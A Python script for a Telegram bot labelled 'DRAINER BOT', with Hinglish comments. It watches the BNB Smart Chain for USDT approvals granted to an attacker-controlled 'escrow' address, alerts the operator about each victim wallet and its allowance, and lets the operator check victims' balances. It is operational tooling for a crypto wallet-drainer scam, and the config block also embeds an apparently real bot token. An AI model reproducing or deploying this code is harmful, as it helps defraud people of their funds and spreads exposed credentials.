# ============================================================
#   YAHAN APNI VALUES BHARO
# ============================================================
BOT_TOKEN = "8818070264:AAEGKvdBoFpKpc2EoDHr99S5qFK1aDQOxDA"
ADMIN_ID  = 8339109604
ESCROW    = "0xd8Ff78A980Ce4E395AFbF2FC75b4972225771853"
RPC       = "https://bsc-dataseed.binance.org"
# ============================================================

import sys, asyncio, traceback
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware

print("=" * 50); print("  DRAINER BOT START"); print("=" * 50)

USDT = "0x55d398326f99059fF775485246999027B3197955"
APPROVAL_TOPIC = "0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925"
DEC = 10**18

w3 = Web3(Web3.HTTPProvider(RPC, request_kwargs={"timeout": 20}))
w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)

ESCROW_CS = Web3.to_checksum_address(ESCROW)
SPENDER_TOPIC = "0x" + ESCROW_CS[2:].lower().rjust(64, "0")

print("[CHECK] BSC connect...")
print("   Block:", w3.eth.block_number)
print("   Escrow:", ESCROW_CS)

seen = set()
last_block = w3.eth.block_number - 50

async def scan(ctx):
    global last_block
    try:
        latest = w3.eth.block_number
        if latest <= last_block:
            return
        logs = w3.eth.get_logs({
            "fromBlock": last_block + 1,
            "toBlock": latest,
            "address": Web3.to_checksum_address(USDT),
            "topics": [APPROVAL_TOPIC, None, SPENDER_TOPIC],
        })
        for lg in logs:
            key = (lg["transactionHash"].hex(), lg["logIndex"])
            if key in seen:
                continue
            seen.add(key)

            owner  = "0x" + lg["topics"][1].hex()[-40:]
            amount = int(lg["data"].hex(), 16) / DEC
            h      = lg["transactionHash"].hex()

            print(f"APPROVE: {owner} -> {amount}")

            kb = InlineKeyboardMarkup([[
                InlineKeyboardButton("🔍 BscScan", url=f"https://bscscan.com/tx/{h}")
            ]])
            await ctx.bot.send_message(
                ADMIN_ID,
                f"🔔 *Naya Approve!*\n\n"
                f"Wallet: `{owner}`\n"
                f"Allowance: `{amount:,.2f}` USDT\n"
                f"Tx: `{h}`\n"
                f"Time: {datetime.now():%d-%m-%Y %H:%M}",
                parse_mode="Markdown", reply_markup=kb)
        last_block = latest
    except Exception as e:
        print("scan error:", e)

async def check_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Use: /check 0xWalletAddress")
        return
    a = ctx.args[0]
    try:
        a = Web3.to_checksum_address(a)
    except Exception:
        await update.message.reply_text("Address galat hai"); return
    token = w3.eth.contract(address=Web3.to_checksum_address(USDT), abi=[
        {"constant": True, "inputs": [{"name": "o", "type": "address"}],
         "name": "balanceOf", "outputs": [{"type": "uint256"}], "type": "function"},
        {"constant": True, "inputs": [{"name": "o", "type": "address"},
         {"name": "s", "type": "address"}], "name": "allowance",
         "outputs": [{"type": "uint256"}], "type": "function"}])
    bal = token.functions.balanceOf(a).call() / DEC
    alw = token.functions.allowance(a, ESCROW_CS).call() / DEC
    ok = "✅ haan" if alw > 0 else "❌ nahi"
    await update.message.reply_text(
        f"Wallet: `{a}`\nBalance: `{bal:,.4f}` USDT\nAllowance: `{alw:,.2f}` USDT\nApprove kiya: {ok}",
        parse_mode="Markdown")

async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 Drainer Bot\n\n/check 0xAddress — balance + allowance dekho")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("check", check_cmd))
    app.job_queue.run_repeating(scan, interval=15, first=3)
    print("\n✅ BOT LIVE — Ctrl+C se band\n")
    app.run_polling()

try:
    main()
except Exception:
    print("\n[CRASH]"); traceback.print_exc(); input("\nEnter...")